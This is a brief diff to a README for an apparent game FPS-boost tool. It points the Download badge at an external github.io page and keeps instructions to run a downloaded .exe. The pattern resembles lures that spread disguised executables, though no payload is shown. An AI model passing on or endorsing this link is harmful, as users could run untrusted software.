@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mhwilds-optimizer-fps-boost.github.io/.github/)
 
 ## 📸 Overview
  ![mhwilds-fpsboost-framerates](https://github.com/user-attachments/assets/42edcf2e-21d3-4276-956b-fad310634604)
